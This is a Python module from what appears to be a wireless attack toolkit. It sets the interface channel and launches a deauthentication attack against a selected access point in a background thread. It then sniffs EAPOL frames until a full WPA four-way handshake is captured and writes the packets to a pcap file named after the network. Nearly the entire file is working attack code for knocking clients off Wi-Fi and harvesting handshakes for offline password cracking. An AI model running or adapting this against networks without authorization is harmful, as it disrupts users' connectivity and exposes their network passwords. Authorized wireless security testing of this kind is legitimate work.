import scapy.all as scapy
import globals
import threading
import subprocess
import time
import attacks.deauth as deauth

class capture:
    def __init__(self):
        self._stop = threading.Event()
        self.file = "capture.pcap"
        self.found_packets = []
        self.found_handshake = False
        self.first_eapol_time = None
        self.ap_filter = globals.selected_bssid.lower()
        self.to_frames = 0
        self.from_frames = 0
        try:
            subprocess.run(["iw", "dev", globals.interface, "set", "channel", str(globals.channel)], check=True)
        except Exception as e:
            print(f"Failed to set channel via iw: {e}")
    def stop(self):
        self._stop.set()
    def reset(self):
        self._stop = threading.Event()
    def check_packet(self, p):
        self.found_packets.append(p)
        
        if p.haslayer("EAPOL"):
            # Direction check
            to_ds = p.FCfield & 0b01 != 0 
            if to_ds:
                self.from_frames += 1  # CLI -> AP
            else:
                self.to_frames += 1    # AP -> CLI
            
            if self.to_frames >= 4 and self.from_frames >= 4:
                if not self.found_handshake:
                    self.found_handshake = True
                    self.start_buffer_time = time.time()

        if self.found_handshake:
            if time.time() - self.start_buffer_time > 5.0:
                return True
                
        return False
    def capture_handshakes(self):
        d = deauth.DeauthAttack()
        thread = threading.Thread(target=d.start_deauth, daemon=True)
        thread.start()
        bpf_filter = f"wlan addr2 {globals.selected_bssid.lower()} or wlan addr3 {globals.selected_bssid.lower()}"        
        scapy.sniff(filter = bpf_filter, iface = globals.interface, stop_filter= lambda p: self.check_packet(p) or self._stop.is_set())
        scapy.wrpcapng(f"{globals.selected_ssid}.pcap", self.found_packets, verbose=0)
        self.found_handshake = True
        d.stop()

